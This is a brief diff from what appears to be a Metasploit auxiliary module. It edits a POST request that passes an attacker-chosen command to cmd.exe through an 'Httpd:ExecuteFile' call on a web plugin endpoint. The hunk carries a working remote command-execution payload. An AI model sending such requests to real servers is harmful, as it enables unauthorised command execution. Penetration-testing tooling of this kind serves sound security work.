@@ -53,7 +53,7 @@ class Metasploit3 < Msf::Auxiliary
 		send_request_cgi({
 				'uri'     => '/plugins/framework/script/content.hts',
 				'method'  => 'POST',
-				'data'    => 'obj=Httpd:ExecuteFile(,cmd.exe,/c,' + cmd + ',)'
+				'data'    => 'obj=Httpd:ExecuteFile(,cmd.exe,/c,' + cmd + ',' + ')'
 			}, 3)
 	end
 
